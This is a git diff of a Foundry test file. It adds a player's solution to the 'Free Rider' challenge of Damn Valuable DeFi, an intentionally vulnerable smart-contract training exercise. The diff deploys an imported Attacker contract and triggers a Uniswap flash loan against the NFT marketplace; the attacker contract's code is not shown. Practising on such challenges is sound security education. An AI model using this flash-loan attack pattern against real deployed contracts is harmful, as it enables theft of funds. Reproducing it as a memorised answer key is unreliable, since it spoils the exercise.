@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,21 @@ contract FreeRiderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_freeRider() public checkSolvedByPlayer {}
+    function test_freeRider() public checkSolvedByPlayer  {
+        emit log_named_decimal_uint("initial marketplace.offersCount", marketplace.offersCount(), 0);
+        emit log_named_decimal_uint("initial marketplace eth balance", address(marketplace).balance, 18);
+        emit log_named_decimal_uint("initial player ETH balance", player.balance, 18);
+        emit log_named_decimal_uint("initial recoveryManager ETH balance", address(recoveryManager).balance, 18);
+        
+        Attacker attackerContract = new Attacker(player, weth, uniswapPair, token, marketplace, nft, recoveryManager);
+        console.log();
+        console.log("Attacker contract deployed successfully");
+        console.log("flashloan called");
+        console.log();
+
+        uint256 amountToBorrowWETH = NFT_PRICE;
+        attackerContract.performFlashloan{value: 0}(uniswapPair, amountToBorrowWETH);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
